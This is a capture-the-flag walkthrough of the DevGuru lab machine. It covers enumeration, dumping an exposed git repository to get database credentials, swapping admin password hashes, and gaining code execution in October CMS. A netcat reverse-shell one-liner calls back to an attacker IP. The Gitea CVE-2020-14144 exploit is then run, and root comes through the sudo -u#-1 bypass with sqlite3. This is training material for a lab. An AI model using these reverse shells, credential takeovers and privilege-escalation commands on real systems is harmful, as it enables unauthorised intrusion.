# Recon
## NMAP
- tcp/22
- tcp/80
- tcp/8585 - HTTP

## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6]
└─# ffuf -u http://192.168.236.6/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.php,.txt" -fw 1,2,20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.6/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1,2,20
________________________________________________

.htaccess               [Status: 200, Size: 1678, Words: 282, Lines: 53]
                        [Status: 200, Size: 12669, Words: 929, Lines: 331]
0                       [Status: 200, Size: 12669, Words: 929, Lines: 331]
about                   [Status: 200, Size: 18661, Words: 977, Lines: 478]
backend                 [Status: 302, Size: 410, Words: 60, Lines: 12]
index.php               [Status: 200, Size: 12719, Words: 929, Lines: 331]
Services                [Status: 200, Size: 10032, Words: 815, Lines: 267]
:: Progress: [18460/18460] :: Job [1/1] :: 42 req/sec :: Duration: [0:06:45] :: Errors: 6 ::
```
- `backend`
- `htaccess`
### Nikto
```
┌──(root💀kali)-[~/vulnHub/DevGuru]
└─# nikto -ask=no -h http://192.168.236.6:80 2>&1 | tee "/root/vulnHub/DevGuru/192.168.236.6/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.236.6
+ Target Hostname:    192.168.236.6
+ Target Port:        80
+ Start Time:         2022-01-22 20:39:22 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3093: /.htaccess: Contains configuration and/or authorization information
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason for this.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
+ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-01-22 20:45:54 (GMT8) (392 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- Git Repository Found:
	- `.git`
	- `.git/index`
	- `.git/HEAD`
	- `.git/config`
	- `.gitignore`

## TCP/8585 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/DevGuru]
└─# ffuf -u http://192.168.236.6:8585/FUZZ -w /usr/share/wordlists/dirb/common.txt -e ".html,.txt,.php" -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.236.6:8585/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 2
________________________________________________

                        [Status: 200, Size: 10383, Words: 807, Lines: 296]
debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
:: Progress: [18460/18460] :: Job [1/1] :: 741 req/sec :: Duration: [0:00:28] :: Errors: 0 ::

```
# Initial Foothold
## TCP/8585 - Gitea 
1. Proceed to `debug`
	![](images/Pasted%20image%2020220122204915.png)
2. Both directories returned 404.
		![](images/Pasted%20image%2020220122204944.png)
	- Gitea: 1.12.5
3. Proceed to `http://192.168.236.6:8585/explore/users`
	![](images/Pasted%20image%2020220122205020.png)
	- frank
4. Found an exploit that requires authentication
	```
	┌──(root💀kali)-[~/tools/GitTools/Extractor]
	└─# searchsploit gitea 1.12.5
	------------------------------------------------------------------------------------
    Exploit Title           						     | Path
	------------------------------------------------------------------------------------
	Gitea 1.12.5 - Remote Code Execution (Authenticated) | multiple/webapps/49571.py
	------------------------------------------------------------------------------------
	```
5. Unable to use exploit, no valid credentials
	


## TCP/80 - October CMS (RCE)
1. View `.htaccess`
	![](images/Pasted%20image%2020220122202833.png)
	- Black Listed: (Not allowed to access)
		-  `^bootstrap/.* index.php`: Redirects to `index.php`	
		- [`^`](https://httpd.apache.org/docs/2.4/rewrite/intro.html): matches the beginning of a string
		- [`L,NC`](https://httpd.apache.org/docs/2.4/rewrite/flags.html): 
			- `L`: process the rule immediately when match
			- `NC`: no case
	- White Listed:
		- `/adminer.php`
2. View enumerated directories 	
	- `backend`
		![](images/Pasted%20image%2020220122202247.png)
	- `adminer.php`
		![](images/Pasted%20image%2020220122203146.png)
		- No exploits found for `adminer 4.7.7`
3. Extract all contents from `.git` w/ [`gitdumper.sh`](https://github.com/internetwache/GitTools.git)
	```
	┌──(root💀kali)-[~/tools/GitTools/Dumper]
	└─# ./gitdumper.sh http://192.168.236.6/.git/ /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru
	[+] Creating /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru/.git/
	[+] Downloaded: HEAD
	[-] Downloaded: objects/info/packs
	[+] Downloaded: description
	[+] Downloaded: config
	[+] Downloaded: COMMIT_EDITMSG
	[+] Downloaded: index
	[-] Downloaded: packed-refs
	[+] Downloaded: refs/heads/master
	[-] Downloaded: refs/remotes/origin/HEAD
	[-] Downloaded: refs/stash
	[+] Downloaded: logs/HEAD
	...
	```
4. Recover incomplete git repositories w/ `extractor.sh`
	```
	┌──(root💀kali)-[~/tools/GitTools/Extractor]
	└─# ./extractor.sh /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru/ /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump/
	[+] Found commit: 7de9115700c5656c670b34987c6fbffd39d90cf2
	[+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/.gitignore
	[+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/.htaccess
	[+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/README.md
	[+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/adminer.php
	...
	```
5. View `config/database.php`
	![](images/Pasted%20image%2020220123051458.png)
	- october:SQ66EBYx4GT3byXH
6. Login to Adminer
	![](images/Pasted%20image%2020220123014726.png)
7. View backend_users
	![](images/Pasted%20image%2020220123015231.png)
8. Generate hash
	```
	┌──(root💀kali)-[~/tools/GitTools/Extractor]
	└─# htpasswd -nbBC 10 frank password
	frank:$2y$10$RT6DEmOZIxbj/uv0MLyEWuPUMNSr6s1r7JXzCCOI/kHZCiq/0cN9.
	```
9. Replace frank's hash
	![](images/Pasted%20image%2020220123015930.png)
10. Login
11. Proceed to CMS -> Home
12. [Insert code execution functionality](https://octobercms.com/forum/post/running-php-code-on-pages)
	![](images/Pasted%20image%2020220123024335.png)
13. Test RCE
	![](images/Pasted%20image%2020220123024639.png)
14. Encode payload
	```
	┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit]
	└─# hURL --URL "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.236.4 4444>/tmp/f"

	Original    :: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.236.4 4444>/tmp/f
	URL ENcoded :: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.236.4%204444%3E%2Ftmp%2Ff
	```
15. Execute reverse shell 
	```
	┌──(root💀kali)-[~/tools/GitTools/Extractor]
	└─# curl http://192.168.236.6/?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.236.4+4444%3E%2Ftmp%2Ff
	```
	![](images/Pasted%20image%2020220123025230.png)



		
	
# Privilege Escalation
## Frank - Via Creds Found in Linux + Gitea (RCE)
1. Ran linpeas, found interesting file
	![](images/Pasted%20image%2020220123033744.png)
2. View `/var/backups/app.ini.bak`
	![](images/Pasted%20image%2020220123033838.png)
	- gitea:UfFPTF8C8jjxVF2m
3. Access mysql w/ gitea:UfFPTF8C8jjxVF2m
	```
	www-data@devguru:/var/www/html$ mysql -u gitea -p
	Enter password: UfFPTF8C8jjxVF2m
	MariaDB [gitea]> SHOW databases;
	MariaDB [gitea]> USE gitea;
	MariaDB [gitea]> SHOW tables;
	MariaDB [gitea]> SELECT * FROM user;
	MariaDB [gitea]> SELECT name,passwd from user;
	frank:c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900 
	MariaDB [gitea]> SELECT name, login_name, passwd, passwd_hash_algo FROM user;
	+-------+------------+----------+------------------+
	| name  | login_name | passwd   | passwd_hash_algo |
	+-------+------------+----------+------------------+
	| frank |            | c200.... | pbkdf2           |
	+-------+------------+----------+------------------+

	```
4. Unable to identify hash
5. Generate bcrypt hash
	![](images/Pasted%20image%2020220123044227.png)
6. Change password
	```
	MariaDB [gitea]> UPDATE user       
		-> SET login_name = 'frank'
		-> WHERE name='frank';
	Query OK, 0 rows affected (0.01 sec)
	Rows matched: 1  Changed: 1  Warnings: 0

	MariaDB [gitea]> UPDATE user 
		-> SET passwd_hash_algo = 'bcrypt'
		-> WHERE name='frank';
	Query OK, 1 row affected (0.00 sec)
	Rows matched: 1  Changed: 1  Warnings: 0

	MariaDB [gitea]> UPDATE user 
		-> SET passwd = '$2a$12$3mVpdsh50M28M0QAQts65uNhSlhJkp3qdx6C97Gd9wUp.2nQ.jI46'
		-> WHERE name='frank';
	Query OK, 1 row affected (0.00 sec)
	Rows matched: 1  Changed: 1  Warnings: 0
	```
	![](images/Pasted%20image%2020220123043131.png)
7. Login w/ frank:password
	![](images/Pasted%20image%2020220123043329.png)![](images/Pasted%20image%2020220123043343.png)
8. Earlier, we found an exploit that requires authentication, run it
	```
	┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea/rce]
	└─#  git config --global user.email "asdf@example.com"
	┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea/rce]
	└─# git config --global user.name "asdf"
	┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea]
	└─# python3 49571.py -t http://$ip:8585 -u frank -p password -I 192.168.236.4 -P 1337 
		_____ _ _______
	   / ____(_)__   __|             CVE-2020-14144
	  | |  __ _   | | ___  __ _
	  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
	  | |__| | |  | |  __/ (_| |
	   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5

	[+] Starting exploit ...
	hint: Using 'master' as the name for the initial branch. This default branch name
	hint: is subject to change. To configure the initial branch name to use in all
	hint: of your new repositories, which will suppress this warning, call:
	hint: 
	hint: 	git config --global init.defaultBranch <name>
	hint: 
	hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
	hint: 'development'. The just-created branch can be renamed via this command:
	hint: 
	hint: 	git branch -m <name>
	Initialized empty Git repository in /tmp/tmp.T8KmuZEi5T/.git/
	[master (root-commit) d9313e2] Initial commit
	 1 file changed, 1 insertion(+)
	 create mode 100644 README.md
	Enumerating objects: 3, done.
	Counting objects: 100% (3/3), done.
	Writing objects: 100% (3/3), 240 bytes | 240.00 KiB/s, done.
	[+] Exploit completed !
	┌──(root💀kali)-[~/tools/GitTools/Extractor]
	└─# nc -nvlp 1337
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::1337
	Ncat: Listening on 0.0.0.0:1337
	Ncat: Connection from 192.168.236.6.
	Ncat: Connection from 192.168.236.6:44070.
	bash: cannot set terminal process group (755): Inappropriate ioctl for device
	bash: no job control in this shell
	frank@devguru:~/gitea-repositories/frank/vuln.git$ whoami
	whoami
	frank
	```
	![](images/Pasted%20image%2020220123045012.png)
9. Manual exploit
	- https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
10. Flag
	```
	frank@devguru:/home/frank$ cat user.txt
	cat user.txt
	22854d0aec6ba776f9d35bf7b0e00217
	frank@devguru:/home/frank$ 
	```

## Root - Via Sudo Exploit + Sudo GTFO Bin
1. Ran linpeas
	![](images/Pasted%20image%2020220123052110.png)
2. Find exploit
	 - https://www.exploit-db.com/exploits/47502
	 - Saw this in TryHackMe: AgentSudo
3. Check for sudo access
	```
	frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -l
	sudo -l
	Matching Defaults entries for frank on devguru:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User frank may run the following commands on devguru:
		(ALL, !root) NOPASSWD: /usr/bin/sqlite3
	```
4. Exploit
	```
	frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
	<o -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
	sh: 0: getcwd() failed: No such file or directory
	sh: 0: getcwd() failed: No such file or directory
	whoami
	root
	```
	![](images/Pasted%20image%2020220123045746.png)
5. Flag
	```
	root@devguru:/# cd /root
	cd /root
	root@devguru:/root# ls  
	ls
	msg.txt  root.txt
	root@devguru:/root# cat *
		   Congrats on rooting DevGuru!
	  Contact me via Twitter @zayotic to give feedback!


	96440606fb88aa7497cde5a8e68daf8f
	root@devguru:/root# 
	```
	![](images/Pasted%20image%2020220123045956.png)
	



---
Tags: #tcp/80-http/rce #linux-priv-esc/linux-creds-found  #tcp/80-http/web-app-cms-exploit 

---

